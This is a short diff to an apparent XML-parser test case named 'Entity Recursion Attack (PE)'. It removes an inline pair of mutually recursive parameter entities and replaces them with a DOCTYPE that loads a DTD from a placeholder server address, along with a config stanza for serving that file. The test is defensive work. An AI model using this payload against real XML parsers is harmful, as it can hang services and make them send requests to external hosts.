@@ -3,10 +3,12 @@
 [General]
 name: Entity Recursion Attack (PE)
 description: Entity Expansion Attack that causes an endless loop (Parameter Entity Version)
+
+[ServerResponse /entity-recursion-pe.dtd]
+content: entity-recursion-pe.dtd
+log-request: no
 -->
-<!DOCTYPE root [
-  <!ENTITY % a "a%b;">
-  <!ENTITY % b "b%a;">
-  <!ENTITY c "%a;">
+<!DOCTYPE root SYSTEM "http://{server_address}/entity-recursion-pe.dtd" [
+    <!ELEMENT root (#PCDATA)>
 ]>
-<root>&c;</root>
+<root>&attack;</root>
